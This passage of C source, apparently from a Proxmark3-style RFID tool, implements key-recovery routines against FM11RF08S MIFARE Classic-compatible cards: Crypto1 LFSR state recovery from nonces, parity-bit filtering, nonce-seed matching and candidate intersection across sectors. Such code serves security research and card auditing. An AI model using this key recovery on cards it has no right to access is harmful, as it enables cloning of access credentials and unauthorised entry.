        PrintAndLogEx(WARNING, "Default-key dictionary did not authenticate to any FM11RF08S sector");
    }
    free(e_sector);
    return retval;
}

/*
 * Check parity-bit consistency for a candidate LFSR key.
 *
 * crypto1_word uses BEBIT(in,i) = BIT(in, i^24), so it clocks byte 3 (MSB)
 * first and byte 0 (LSB) last.  In the MIFARE 9-bit wire format the parity
 * bits for bytes 3..1 are interleaved inside ks1 (at clocks 8, 17, 26) and
 * are NOT accessible from crypto1_word's output.  Only the parity bit for
 * byte 0 (the last wire byte) appears as the very first bit of ks2:
 *
 *   byte 0 (nt bits  7..0, sent last on wire ): ks2 bit 24  ← reliable
 *   byte 1 (nt bits 15..8 ): ks2 bit 25  ← only valid if par_err reliable
 *   byte 2 (nt bits 23..16): ks2 bit 26  ← only valid if par_err reliable
 *   byte 3 (nt bits 31..24): ks2 bit 27  ← only valid if par_err reliable
 *
 * usable_mask bit 0 = byte 0 (default 0x1 = original single-bit behaviour).
 * Enable higher bits only after verifying par_err quality on your hardware.
 */
static bool fm11_check_nt_parity_bits(
    uint64_t lfsr,
    uint32_t uid,
    uint32_t nt,
    uint8_t nt_par_enc,
    uint8_t usable_mask
) {
    struct Crypto1State *s = crypto1_create(lfsr);
    if (s == NULL) {
        return false;
    }

    crypto1_word(s, nt ^ uid, 0);
    uint32_t ks2 = crypto1_word(s, 0, 0);

    for (uint8_t byte_i = 0; byte_i < 4; byte_i++) {
        if (usable_mask & (1U << byte_i)) {
            uint8_t ks_par        = (ks2 >> (24 + byte_i)) & 1;
            uint8_t observed_dec  = ((nt_par_enc >> byte_i) & 1) ^ ks_par;
            uint8_t nt_byte       = (nt >> (byte_i * 8)) & 0xFF;
            if (observed_dec != oddparity8(nt_byte)) {
                crypto1_destroy(s);
                return false;
            }
        }
    }

    crypto1_destroy(s);
    return true;
}

static int fm11_generate_1nt_candidates(uint32_t uid, uint32_t nt, uint32_t nt_enc, uint8_t par_err, uint8_t parity_mask, fm11_keylist_t *out) {
    if (out == NULL) {
        return PM3_EINVARG;
    }

    uint8_t nt_par_enc = ((((par_err >> 3) & 1) ^ oddparity8((nt_enc >> 24) & 0xFF)) << 3) |
                         ((((par_err >> 2) & 1) ^ oddparity8((nt_enc >> 16) & 0xFF)) << 2) |
                         ((((par_err >> 1) & 1) ^ oddparity8((nt_enc >>  8) & 0xFF)) << 1) |
                         ((((par_err >> 0) & 1) ^ oddparity8((nt_enc >>  0) & 0xFF)) << 0);
    uint32_t ks1 = nt ^ nt_enc;
    struct Crypto1State *revstate = lfsr_recovery32(ks1, nt ^ uid);
    if (revstate == NULL) {
        return PM3_EMALLOC;
    }

    struct Crypto1State *revstate_start = revstate;

    uint32_t checked = 0;
    while ((revstate->odd != 0) || (revstate->even != 0)) {
        if (((checked++ & 0x3FF) == 0) && kbd_enter_pressed()) {
            crypto1_destroy(revstate_start);
            return PM3_EOPABORTED;
        }
        uint64_t lfsr = 0;
        lfsr_rollback_word(revstate, nt ^ uid, 0);
        crypto1_get_lfsr(revstate, &lfsr);

        if (fm11_check_nt_parity_bits(lfsr, uid, nt, nt_par_enc, parity_mask)) {
            int res = fm11_keylist_push(out, lfsr, 0);
            if (res != PM3_SUCCESS || out->count >= FM11RF08S_GENERATED_KEY_LIMIT) {
                crypto1_destroy(revstate_start);
                return res;
            }
        }
        revstate++;
    }

    crypto1_destroy(revstate_start);
    return PM3_SUCCESS;
}

static uint16_t fm11_i_lfsr16[1 << 16] = {0};
static uint16_t fm11_s_lfsr16[1 << 16] = {0};
static uint16_t fm11_prev8_lfsr16[1 << 16] = {0};
static uint16_t fm11_prev14_lfsr16[1 << 16] = {0};
static bool fm11_lfsr16_ready = false;

static uint16_t fm11_prev_lfsr16(uint16_t nonce);

static void fm11_init_lfsr16_table(void) {
    if (fm11_lfsr16_ready) {
        return;
    }
    uint16_t x = 1;
    for (uint16_t i = 1; i; ++i) {
        fm11_i_lfsr16[(x & 0xff) << 8 | x >> 8] = i;
        fm11_s_lfsr16[i] = (x & 0xff) << 8 | x >> 8;
        x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15;
    }
    for (uint32_t nonce = 0; nonce <= UINT16_MAX; nonce++) {
        uint16_t p = nonce;
        for (uint8_t i = 0; i < 8; i++) {
            p = fm11_prev_lfsr16(p);
        }
        fm11_prev8_lfsr16[nonce] = p;
        for (uint8_t i = 8; i < 14; i++) {
            p = fm11_prev_lfsr16(p);
        }
        fm11_prev14_lfsr16[nonce] = p;
    }
    fm11_lfsr16_ready = true;
}

static uint16_t fm11_prev_lfsr16(uint16_t nonce) {
    uint16_t i = fm11_i_lfsr16[nonce];
    i = (i == 1) ? 0xffff : i - 1;
    return fm11_s_lfsr16[i];
}

static uint16_t fm11_compute_seednt16_nt32(uint32_t nt32, uint64_t key) {
    static const uint8_t a[] = {0, 8, 9, 4, 6, 11, 1, 15, 12, 5, 2, 13, 10, 14, 3, 7};
    static const uint8_t b[] = {0, 13, 1, 14, 4, 10, 15, 7, 5, 3, 8, 6, 9, 2, 12, 11};
    uint16_t nt = fm11_prev14_lfsr16[nt32 >> 16];

    bool odd = true;
    for (uint8_t i = 0; i < 6 * 8; i += 8) {
        if (odd) {
            nt ^= a[(key >> i) & 0xF];
            nt ^= b[(key >> i >> 4) & 0xF] << 4;
        } else {
            nt ^= b[(key >> i) & 0xF];
            nt ^= a[(key >> i >> 4) & 0xF] << 4;
        }
        odd = !odd;
        nt = fm11_prev8_lfsr16[nt];
    }
    return nt;
}

static void fm11_compute_seednt16_nt32_vec4(uint32_t nt32, const fm11_candidate_t *candidates, uint16_t out[4]) {
    static const uint8_t a[] = {0, 8, 9, 4, 6, 11, 1, 15, 12, 5, 2, 13, 10, 14, 3, 7};
    static const uint8_t b[] = {0, 13, 1, 14, 4, 10, 15, 7, 5, 3, 8, 6, 9, 2, 12, 11};

    union vec nt = vec_u1(fm11_prev14_lfsr16[nt32 >> 16]);
    for (uint8_t byte_i = 0; byte_i < 6; byte_i++) {
        uint32_t mix[4];
        for (uint8_t lane = 0; lane < 4; lane++) {
            uint8_t key_byte = (candidates[lane].key >> (byte_i * 8)) & 0xFF;
            if ((byte_i & 1) == 0) {
                mix[lane] = a[key_byte & 0x0F] ^ ((uint32_t)b[key_byte >> 4] << 4);
            } else {
                mix[lane] = b[key_byte & 0x0F] ^ ((uint32_t)a[key_byte >> 4] << 4);
            }
        }
        nt = vec_xor(nt, vec_u(mix[0], mix[1], mix[2], mix[3]));
        nt.xu = fm11_prev8_lfsr16[nt.xu & 0xFFFF];
        nt.yu = fm11_prev8_lfsr16[nt.yu & 0xFFFF];
        nt.zu = fm11_prev8_lfsr16[nt.zu & 0xFFFF];
        nt.wu = fm11_prev8_lfsr16[nt.wu & 0xFFFF];
    }

    out[0] = (uint16_t)nt.xu;
    out[1] = (uint16_t)nt.yu;
    out[2] = (uint16_t)nt.zu;
    out[3] = (uint16_t)nt.wu;
}

static int fm11_cmp_candidate_ref(const void *a, const void *b) {
    const fm11_candidate_ref_t *ka = (const fm11_candidate_ref_t *)a;
    const fm11_candidate_ref_t *kb = (const fm11_candidate_ref_t *)b;
    if (ka->key < kb->key) {
        return -1;
    }
    if (ka->key > kb->key) {
        return 1;
    }
    if (ka->sec != kb->sec) {
        return (int)ka->sec - (int)kb->sec;
    }
    if (ka->key_type != kb->key_type) {
        return (int)ka->key_type - (int)kb->key_type;
    }
    if (ka->idx < kb->idx) {
        return -1;
    }
    return ka->idx > kb->idx;
}

static void fm11_reuse_index_free(fm11_reuse_index_t *index) {
    if (index == NULL) {
        return;
    }
    free(index->refs);
    free(index->buckets);
    memset(index, 0, sizeof(*index));
}

static int fm11_reuse_index_build(fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                  fm11_reuse_index_t *index) {
    if (candidates == NULL || index == NULL) {
        return PM3_EINVARG;
    }

    fm11_reuse_index_free(index);

    uint32_t total = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        total += candidates[sec][0].count;
        total += candidates[sec][1].count;
    }
    if (total == 0) {
        return PM3_SUCCESS;
    }

    index->refs = calloc(total, sizeof(fm11_candidate_ref_t));
    if (index->refs == NULL) {
        return PM3_EMALLOC;
    }

    uint32_t pos = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            const fm11_keylist_t *list = &candidates[sec][kt];
            for (uint32_t i = 0; i < list->count; i++) {
                if (((pos & 0x3FF) == 0) && kbd_enter_pressed()) {
                    fm11_reuse_index_free(index);
                    return PM3_EOPABORTED;
                }
                index->refs[pos++] = (fm11_candidate_ref_t) {
                    .key = list->data[i].key,
                    .sec = sec,
                    .key_type = kt,
                    .idx = i,
                };
            }
        }
    }
    index->ref_count = pos;
    qsort(index->refs, index->ref_count, sizeof(fm11_candidate_ref_t), fm11_cmp_candidate_ref);

    uint32_t bucket_count = 0;
    for (uint32_t i = 0; i < index->ref_count;) {
        if (((i & 0x3FF) == 0) && kbd_enter_pressed()) {
            fm11_reuse_index_free(index);
            return PM3_EOPABORTED;
        }
        uint32_t j = i + 1;
        while (j < index->ref_count && index->refs[j].key == index->refs[i].key) {
            j++;
        }
        bucket_count++;
        i = j;
    }

    index->buckets = calloc(bucket_count, sizeof(fm11_reuse_bucket_t));
    if (index->buckets == NULL) {
        fm11_reuse_index_free(index);
        return PM3_EMALLOC;
    }

    uint32_t bi = 0;
    for (uint32_t i = 0; i < index->ref_count;) {
        if (((i & 0x3FF) == 0) && kbd_enter_pressed()) {
            fm11_reuse_index_free(index);
            return PM3_EOPABORTED;
        }
        uint32_t j = i + 1;
        while (j < index->ref_count && index->refs[j].key == index->refs[i].key) {
            j++;
        }
        index->buckets[bi++] = (fm11_reuse_bucket_t) {
            .key = index->refs[i].key,
            .start = i,
            .count = j - i,
        };
        i = j;
    }
    index->bucket_count = bi;
    return PM3_SUCCESS;
}

static const fm11_reuse_bucket_t *fm11_reuse_index_find(const fm11_reuse_index_t *index, uint64_t key) {
    if (index == NULL || index->bucket_count == 0) {
        return NULL;
    }
    key &= 0xFFFFFFFFFFFFULL;
    uint32_t lo = 0;
    uint32_t hi = index->bucket_count;
    while (lo < hi) {
        uint32_t mid = lo + ((hi - lo) / 2);
        if (index->buckets[mid].key < key) {
            lo = mid + 1;
        } else {
            hi = mid;
        }
    }
    if (lo < index->bucket_count && index->buckets[lo].key == key) {
        return &index->buckets[lo];
    }
    return NULL;
}

static int fm11_cmp_scored_candidate(const void *a, const void *b) {
    const fm11_scored_candidate_t *ca = (const fm11_scored_candidate_t *)a;
    const fm11_scored_candidate_t *cb = (const fm11_scored_candidate_t *)b;
    if (ca->score != cb->score) {
        return (ca->score < cb->score) ? -1 : 1;
    }
    if (ca->ordinal != cb->ordinal) {
        return (ca->ordinal < cb->ordinal) ? -1 : 1;
    }
    return 0;
}

static int fm11_cmp_reuse_priority(const void *a, const void *b) {
    const fm11_reuse_priority_t *pa = (const fm11_reuse_priority_t *)a;
    const fm11_reuse_priority_t *pb = (const fm11_reuse_priority_t *)b;
    if (pa->sectors != pb->sectors) {
        return (pa->sectors > pb->sectors) ? -1 : 1;
    }
    if (pa->refs != pb->refs) {
        return (pa->refs > pb->refs) ? -1 : 1;
    }
    if (pa->ordinal != pb->ordinal) {
        return (pa->ordinal < pb->ordinal) ? -1 : 1;
    }
    if (pa->key < pb->key) {
        return -1;
    }
    return pa->key > pb->key;
}

static void fm11_compute_list_seeds(fm11_keylist_t *list, uint32_t nt) {
    if (list == NULL) {
        return;
    }
    fm11_init_lfsr16_table();
    uint32_t i = 0;
    for (; i + 4 <= list->count; i += 4) {
        if (list->data[i].seed_valid || list->data[i + 1].seed_valid ||
                list->data[i + 2].seed_valid || list->data[i + 3].seed_valid) {
            for (uint8_t lane = 0; lane < 4; lane++) {
                if (list->data[i + lane].seed_valid == false) {
                    list->data[i + lane].seed = fm11_compute_seednt16_nt32(nt, list->data[i + lane].key);
                    list->data[i + lane].seed_valid = true;
                }
            }
            continue;
        }
        uint16_t seeds[4];
        fm11_compute_seednt16_nt32_vec4(nt, list->data + i, seeds);
        for (uint8_t lane = 0; lane < 4; lane++) {
            list->data[i + lane].seed = seeds[lane];
            list->data[i + lane].seed_valid = true;
        }
    }
    for (; i < list->count; i++) {
        if (list->data[i].seed_valid == false) {
            list->data[i].seed = fm11_compute_seednt16_nt32(nt, list->data[i].key);
            list->data[i].seed_valid = true;
        }
    }
}

static uint32_t fm11_count_candidate_seed_matches_vec(const fm11_keylist_t *list, uint16_t needle, uint32_t max_matches) {
    if (list == NULL || list->count == 0) {
        return 0;
    }

    const union vec target = VEC_U(needle, needle, needle, needle);
    uint32_t matches = 0;
    uint32_t i = 0;
    for (; i + 4 <= list->count; i += 4) {
        const union vec probe = VEC_U(list->data[i].seed, list->data[i + 1].seed,
                                          list->data[i + 2].seed, list->data[i + 3].seed);
        const union vec eq = vec_ueq(probe, target);
        matches += eq.elem.u[0] != 0;
        matches += eq.elem.u[1] != 0;
        matches += eq.elem.u[2] != 0;
        matches += eq.elem.u[3] != 0;
        if (max_matches != 0 && matches >= max_matches) {
            return matches;
        }
    }
    for (; i < list->count; i++) {
        matches += list->data[i].seed == needle;
        if (max_matches != 0 && matches >= max_matches) {
            return matches;
        }
    }
    return matches;
}

static int fm11_filter_candidates_by_seed(fm11_keylist_t *list, uint32_t nt, uint16_t seed,
                                          uint32_t *old_count, uint32_t *new_count) {
    if (list == NULL) {
        return PM3_EINVARG;
    }
    if (old_count != NULL) {
        *old_count = list->count;
    }
    if (new_count != NULL) {
        *new_count = list->count;
    }
    if (list->count == 0) {
        return PM3_SUCCESS;
    }

    fm11_compute_list_seeds(list, nt);
    uint32_t matches = fm11_count_candidate_seed_matches_vec(list, seed, 0);
    if (new_count != NULL) {
        *new_count = matches;
    }
    if (matches == 0 || matches == list->count) {
        return PM3_SUCCESS;
    }

    fm11_keylist_t filtered = {0};
    int res = fm11_keylist_reserve(&filtered, matches);
    if (res != PM3_SUCCESS) {
        return res;
    }

    const union vec target = VEC_U(seed, seed, seed, seed);
    uint32_t i = 0;
    for (; i + 4 <= list->count; i += 4) {
        const union vec probe = VEC_U(list->data[i].seed, list->data[i + 1].seed,
                                          list->data[i + 2].seed, list->data[i + 3].seed);
        const union vec eq = vec_ueq(probe, target);
        if (eq.elem.u[0] != 0) {
            filtered.data[filtered.count++] = list->data[i];
        }
        if (eq.elem.u[1] != 0) {
            filtered.data[filtered.count++] = list->data[i + 1];
        }
        if (eq.elem.u[2] != 0) {
            filtered.data[filtered.count++] = list->data[i + 2];
        }
        if (eq.elem.u[3] != 0) {
            filtered.data[filtered.count++] = list->data[i + 3];
        }
    }
    for (; i < list->count; i++) {
        if (list->data[i].seed == seed) {
            filtered.data[filtered.count++] = list->data[i];
        }
    }

    free(list->data);
    *list = filtered;
    return PM3_SUCCESS;
}

static int fm11_prioritize_by_paired_seed(fm11_keylist_t *list, const fm11_keylist_t *paired) {
    if (list == NULL || paired == NULL || list->count < 2 || paired->count == 0) {
        return PM3_SUCCESS;
    }

    /* uint16 count caps at 65535 — sufficient for scoring; 128KB vs 256KB,
     * fits in L2 cache for typical 65K-wide seed space access patterns */
    uint16_t *paired_seed_count = calloc(UINT16_MAX + 1, sizeof(uint16_t));
    fm11_scored_candidate_t *scored = calloc(list->count, sizeof(fm11_scored_candidate_t));
    if (paired_seed_count == NULL || scored == NULL) {
        free(paired_seed_count);
        free(scored);
        return PM3_EMALLOC;
    }

    for (uint32_t i = 0; i < paired->count; i++) {
        uint16_t s = paired->data[i].seed;
        if (paired_seed_count[s] < UINT16_MAX) {
            paired_seed_count[s]++;
        }
    }
    for (uint32_t i = 0; i < list->count; i++) {
        uint32_t score = paired_seed_count[list->data[i].seed];
        scored[i] = (fm11_scored_candidate_t) {
            .candidate = list->data[i],
            .score = (score == 0) ? UINT32_MAX : score,
            .ordinal = i,
        };
    }

    qsort(scored, list->count, sizeof(fm11_scored_candidate_t), fm11_cmp_scored_candidate);
    for (uint32_t i = 0; i < list->count; i++) {
        list->data[i] = scored[i].candidate;
    }

    free(paired_seed_count);
    free(scored);
    return PM3_SUCCESS;
}

static int fm11_intersect_pair(uint32_t nt_a, fm11_keylist_t *a, uint32_t nt_b, fm11_keylist_t *b) {
    if (a == NULL || b == NULL || a->count == 0 || b->count == 0 || nt_a == nt_b) {
        return PM3_SUCCESS;
    }

    fm11_compute_list_seeds(a, nt_a);
    fm11_compute_list_seeds(b, nt_b);

    /*
     * Use 1KB bitsets (fits entirely in L1 cache) instead of 256KB uint32
     * count arrays.  Random 16-bit seed accesses hit L1 every time →
     * zero cache-miss stalls on the hot inner loops.
     */
    enum { BSET_WORDS = (UINT16_MAX + 1) / 64 };  /* 1024 uint64 = 8192 bytes */
    uint64_t *bset_a = calloc(BSET_WORDS, sizeof(uint64_t));
    uint64_t *bset_b = calloc(BSET_WORDS, sizeof(uint64_t));
    if (bset_a == NULL || bset_b == NULL) {
        free(bset_a);
        free(bset_b);
        return PM3_EMALLOC;
    }

#define BSET_SET(bs, s)   ((bs)[(s) >> 6] |=  (UINT64_C(1) << ((s) & 63)))
#define BSET_TEST(bs, s)  (((bs)[(s) >> 6] >>  ((s) & 63)) & 1)

    for (uint32_t i = 0; i < a->count; i++) {
        if (((i & 0x3FF) == 0) && kbd_enter_pressed()) {
            free(bset_a);
            free(bset_b);
            return PM3_EOPABORTED;
        }
        BSET_SET(bset_a, a->data[i].seed);
    }
    for (uint32_t i = 0; i < b->count; i++) {
        if (((i & 0x3FF) == 0) && kbd_enter_pressed()) {
            free(bset_a);
            free(bset_b);
            return PM3_EOPABORTED;
        }
        BSET_SET(bset_b, b->data[i].seed);
    }

    fm11_keylist_t fa = {0};
    fm11_keylist_t fb = {0};
    for (uint32_t i = 0; i < a->count; i++) {
        if (((i & 0x3FF) == 0) && kbd_enter_pressed()) {
            free(bset_a);
            free(bset_b);
            fm11_keylist_free(&fa);
            fm11_keylist_free(&fb);
            return PM3_EOPABORTED;
        }
        if (BSET_TEST(bset_b, a->data[i].seed)) {
            int res = fm11_keylist_push_seeded(&fa, a->data[i].key, a->data[i].seed);
            if (res != PM3_SUCCESS) {
                free(bset_a);
                free(bset_b);
                fm11_keylist_free(&fa);
                fm11_keylist_free(&fb);
                return res;
            }
        }
    }
    for (uint32_t i = 0; i < b->count; i++) {
        if (((i & 0x3FF) == 0) && kbd_enter_pressed()) {
            free(bset_a);
            free(bset_b);
            fm11_keylist_free(&fa);
            fm11_keylist_free(&fb);
            return PM3_EOPABORTED;
        }
        if (BSET_TEST(bset_a, b->data[i].seed)) {
            int res = fm11_keylist_push_seeded(&fb, b->data[i].key, b->data[i].seed);
            if (res != PM3_SUCCESS) {
                free(bset_a);
                free(bset_b);
                fm11_keylist_free(&fa);
                fm11_keylist_free(&fb);
                return res;
            }
        }
    }

#undef BSET_SET
#undef BSET_TEST

    free(bset_a);
    free(bset_b);
    free(a->data);
    free(b->data);
    *a = fa;
    *b = fb;
    return PM3_SUCCESS;
}

/* -----------------------------------------------------------------------
 * fm11_sort_candidates_by_seed_bucket
 *
 * Within a sector, groups A and B candidates by their shared 16-bit seed.
 * Sorts buckets so that "1+1" singletons (seed appears exactly once in both A
 * and B) come first, then "1+N" singletons, then smallest combined count.
 * Promotes the leading candidate from top singleton buckets to the front of
 * each list.
 *
 * Rationale: a 1+1 singleton means checking that A candidate either confirms
 * both keys in one attempt or definitively eliminates that seed — the highest
 * possible information gain per online authentication.
 * ----------------------------------------------------------------------- */
typedef struct {
    uint16_t seed;
    uint32_t a_count;
    uint32_t b_count;
} fm11_seed_bucket_t;

static int fm11_build_seed_buckets(fm11_keylist_t *a, fm11_keylist_t *b,
                                   fm11_seed_bucket_t **buckets_out,
                                   uint32_t *bucket_count_out) {
    uint32_t *count_a = calloc(UINT16_MAX + 1, sizeof(uint32_t));
    uint32_t *count_b = calloc(UINT16_MAX + 1, sizeof(uint32_t));
    if (count_a == NULL || count_b == NULL) {
        free(count_a);
        free(count_b);
        return PM3_EMALLOC;
    }
    for (uint32_t i = 0; i < a->count; i++)
        if (a->data[i].seed_valid) count_a[a->data[i].seed]++;
    for (uint32_t i = 0; i < b->count; i++)
        if (b->data[i].seed_valid) count_b[b->data[i].seed]++;

    uint32_t nbuckets = 0;
    for (uint32_t s = 0; s <= UINT16_MAX; s++)
        if (count_a[s] > 0 || count_b[s] > 0) nbuckets++;

    fm11_seed_bucket_t *buckets = calloc(nbuckets, sizeof(fm11_seed_bucket_t));
    if (buckets == NULL) { free(count_a); free(count_b); return PM3_EMALLOC; }

    uint32_t bi = 0;
    for (uint32_t s = 0; s <= UINT16_MAX && bi < nbuckets; s++) {
        if (count_a[s] == 0 && count_b[s] == 0) continue;
        buckets[bi].seed    = (uint16_t)s;
        buckets[bi].a_count = count_a[s];
        buckets[bi].b_count = count_b[s];
        bi++;
    }
    free(count_a);
    free(count_b);
    *buckets_out = buckets;
    *bucket_count_out = nbuckets;
    return PM3_SUCCESS;
}

static int fm11_cmp_seed_bucket(const void *a, const void *b) {
    const fm11_seed_bucket_t *ba = (const fm11_seed_bucket_t *)a;
    const fm11_seed_bucket_t *bb = (const fm11_seed_bucket_t *)b;
    bool a_both = (ba->a_count == 1 && ba->b_count == 1);
    bool b_both = (bb->a_count == 1 && bb->b_count == 1);
    if (a_both != b_both) return a_both ? -1 : 1;
    bool a_one = (ba->a_count == 1 || ba->b_count == 1);
    bool b_one = (bb->a_count == 1 || bb->b_count == 1);
    if (a_one != b_one) return a_one ? -1 : 1;
    uint32_t sa = ba->a_count + ba->b_count;
    uint32_t sb = bb->a_count + bb->b_count;
    return (sa > sb) - (sa < sb);
}

static int fm11_sort_candidates_by_seed_bucket(fm11_keylist_t *a, fm11_keylist_t *b) {
    if (a == NULL || b == NULL || a->count == 0 || b->count == 0) return PM3_SUCCESS;

    fm11_seed_bucket_t *buckets = NULL;
    uint32_t bucket_count = 0;
    int res = fm11_build_seed_buckets(a, b, &buckets, &bucket_count);
    if (res != PM3_SUCCESS || bucket_count == 0) { free(buckets); return res; }

    qsort(buckets, bucket_count, sizeof(fm11_seed_bucket_t), fm11_cmp_seed_bucket);

    for (uint32_t bi = 0; bi < bucket_count; bi++) {
        if (buckets[bi].a_count == 1) {
            uint16_t target = buckets[bi].seed;
            for (uint32_t i = 0; i < a->count; i++) {
                if (a->data[i].seed_valid && a->data[i].seed == target) {
                    fm11_keylist_promote_or_prepend(a, a->data[i].key);
                    break;
                }
            }
        }
        if (buckets[bi].b_count == 1) {
            uint16_t target = buckets[bi].seed;
            for (uint32_t i = 0; i < b->count; i++) {
                if (b->data[i].seed_valid && b->data[i].seed == target) {
                    fm11_keylist_promote_or_prepend(b, b->data[i].key);
                    break;
                }
            }
        }
        if (buckets[bi].a_count > 1 && buckets[bi].b_count > 1) break;
    }

    free(buckets);
    return PM3_SUCCESS;
}

static int fm11_prioritize_defaults(fm11_keylist_t *list, const fm11_keylist_t *defaults) {
    if (list == NULL || list->count == 0) {
        return PM3_SUCCESS;
    }
    if (defaults == NULL || defaults->count == 0) {
        return PM3_SUCCESS;
    }
    uint32_t dst = 0;
    for (uint32_t d = 0; d < defaults->count; d++) {
        for (uint32_t i = dst; i < list->count; i++) {
            if (list->data[i].key == defaults->data[d].key) {
                fm11_candidate_t tmp = list->data[dst];
                list->data[dst++] = list->data[i];
                list->data[i] = tmp;
                break;
            }
        }
    }
    return PM3_SUCCESS;
}

static int fm11_prioritize_duplicates(fm11_keylist_t keys[FM11RF08S_SECTORS][2],
                                      uint32_t duplicate_prefix[FM11RF08S_SECTORS][2],
                                      uint32_t *duplicate_count) {
    uint32_t total = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            total += keys[sec][kt].count;
            if (duplicate_prefix != NULL) {
                duplicate_prefix[sec][kt] = 0;
            }
        }
    }
    if (duplicate_count != NULL) {
        *duplicate_count = 0;
    }
    if (total == 0) {
        return PM3_SUCCESS;
    }
    /* skip expensive qsort+ref-build when total exceeds the global-priority cap:
     * the dynamic per-sector loop handles it without duplicate pre-sorting */
    if (total > FM11RF08S_MAX_GLOBAL_PRIORITY_KEYS * 32U) {
        return PM3_SUCCESS;
    }

    fm11_candidate_ref_t *refs = calloc(total, sizeof(fm11_candidate_ref_t));
    bool *is_duplicate[FM11RF08S_SECTORS][2] = {{0}};
    if (refs == NULL) {
        return PM3_EMALLOC;
    }

    uint32_t pos = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (keys[sec][kt].count == 0) {
                continue;
            }
            is_duplicate[sec][kt] = calloc(keys[sec][kt].count, sizeof(bool));
            if (is_duplicate[sec][kt] == NULL) {
                for (uint8_t s = 0; s < FM11RF08S_SECTORS; s++) {
                    for (uint8_t k = 0; k < 2; k++) {
                        free(is_duplicate[s][k]);
                    }
                }
                free(refs);
                return PM3_EMALLOC;
            }
            for (uint32_t i = 0; i < keys[sec][kt].count; i++) {
                if (((pos & 0x3FF) == 0) && kbd_enter_pressed()) {
                    for (uint8_t s = 0; s < FM11RF08S_SECTORS; s++) {
                        for (uint8_t k = 0; k < 2; k++) {
                            free(is_duplicate[s][k]);
                        }
                    }
                    free(refs);
                    return PM3_EOPABORTED;
                }
                refs[pos++] = (fm11_candidate_ref_t) {
                    .key = keys[sec][kt].data[i].key,
                    .sec = sec,
                    .key_type = kt,
                    .idx = i,
                };
            }
        }
    }

    qsort(refs, total, sizeof(fm11_candidate_ref_t), fm11_cmp_candidate_ref);
    uint32_t duplicate_refs = 0;
    for (uint32_t i = 0; i < total;) {
        if (((i & 0x3FF) == 0) && kbd_enter_pressed()) {
            for (uint8_t s = 0; s < FM11RF08S_SECTORS; s++) {
                for (uint8_t k = 0; k < 2; k++) {
                    free(is_duplicate[s][k]);
                }
            }
            free(refs);
            return PM3_EOPABORTED;
        }
        uint32_t j = i + 1;
        while (j < total && refs[j].key == refs[i].key) {
            j++;
        }
        bool duplicate = false;
        for (uint32_t k = i + 1; k < j; k++) {
            if (refs[k].sec != refs[i].sec || refs[k].key_type != refs[i].key_type) {
                duplicate = true;
                break;
            }
        }
        if (duplicate) {
            for (uint32_t k = i; k < j; k++) {
                if (is_duplicate[refs[k].sec][refs[k].key_type][refs[k].idx] == false) {
                    is_duplicate[refs[k].sec][refs[k].key_type][refs[k].idx] = true;
                    duplicate_refs++;
                }
            }
        }
        i = j;
    }

    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            fm11_keylist_t *list = &keys[sec][kt];
            uint32_t dst = 0;
            for (uint32_t i = 0; i < list->count; i++) {
                if (((i & 0x3FF) == 0) && kbd_enter_pressed()) {
                    for (uint8_t s = sec; s < FM11RF08S_SECTORS; s++) {
                        for (uint8_t k = 0; k < 2; k++) {
                            free(is_duplicate[s][k]);
                        }
                    }
                    free(refs);
                    return PM3_EOPABORTED;
                }
                if (is_duplicate[sec][kt][i]) {
                    fm11_candidate_t tmp = list->data[dst];
                    list->data[dst++] = list->data[i];
                    list->data[i] = tmp;
                }
            }
            if (duplicate_prefix != NULL) {
                duplicate_prefix[sec][kt] = dst;
            }
            free(is_duplicate[sec][kt]);
            is_duplicate[sec][kt] = NULL;
        }
    }
    free(refs);

    if (duplicate_count != NULL) {
        *duplicate_count = duplicate_refs;
    }
    return PM3_SUCCESS;
}

static bool fm11_derive_pair_key(uint32_t nt_known, uint64_t key_known, uint32_t nt_target, fm11_keylist_t *target, uint64_t *key_out) {
    if (target == NULL || key_out == NULL || nt_known == nt_target) {
        return false;
    }
    uint16_t seed = fm11_compute_seednt16_nt32(nt_known, key_known);
    uint64_t found = 0;
    uint32_t matches = 0;
    fm11_compute_list_seeds(target, nt_target);

    matches = fm11_count_candidate_seed_matches_vec(target, seed, 2);
    if (matches != 1) {
        return false;
    }

    for (uint32_t i = 0; i < target->count; i++) {
        if (seed == target->data[i].seed) {
            found = target->data[i].key;
            break;
        }
    }
    *key_out = found;
    return true;
}

static uint32_t fm11_accept_found_key(const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                      fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                      uint64_t keys_found[FM11RF08S_SECTORS][2],
                                      bool found_key[FM11RF08S_SECTORS][2],
                                      uint8_t sec,
                                      uint8_t key_type,
                                      uint64_t key) {
    if (nonces == NULL || sec >= FM11RF08S_SECTORS || key_type > 1) {
        return 0;
    }
    (void)nonces;
    (void)candidates;

    key &= 0xFFFFFFFFFFFFULL;
    uint32_t accepted = 0;

    if (found_key[sec][key_type] == false) {
        keys_found[sec][key_type] = key;
        found_key[sec][key_type] = true;
        accepted++;
    }

    return accepted;
}

static void fm11_probe_queue_push(fm11_probe_queue_t *q, uint8_t sec, uint8_t kt, uint64_t key) {
    if (q == NULL || q->count >= FM11_PROBE_QUEUE_MAX) {
        return;
    }
    /* avoid duplicates */
    for (uint32_t i = 0; i < q->count; i++) {
        if (q->entries[i].sec == sec && q->entries[i].key_type == kt && q->entries[i].key == key) {
            return;
        }
    }
    q->entries[q->count++] = (fm11_probe_entry_t) {.sec = sec, .key_type = kt, .key = key};
}

static uint32_t fm11_accept_found_key_global(
    const iso14a_fm11rf08s_nonces_with_data_t *nonces,
    fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
    uint64_t keys_found[FM11RF08S_SECTORS][2],
    bool found_key[FM11RF08S_SECTORS][2],
    const fm11_reuse_index_t *reuse_index,
    uint8_t sec,
    uint8_t key_type,
    uint64_t key,
    fm11_probe_queue_t *probe_queue
) {
